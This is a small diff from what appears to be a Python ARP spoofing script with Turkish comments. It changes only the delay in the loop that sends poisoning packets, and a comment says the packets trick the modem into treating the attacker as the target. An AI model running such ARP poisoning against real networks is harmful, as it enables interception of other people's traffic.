@@ -56,7 +56,7 @@ try:
         arp_poisoning(user_gateway_ip,user_target_ip) #Bu request ve response modemi kandıracak.Böylelikle modem bizi hedef sistem olarak görecek.
         number +=2
         print("\rSending Packets: " +str(number),end="")
-        time.sleep(3)
+        time.sleep(4)
 except KeyboardInterrupt:
     print("\nQuit & Reset")
     reset_operation(user_target_ip,user_gateway_ip)
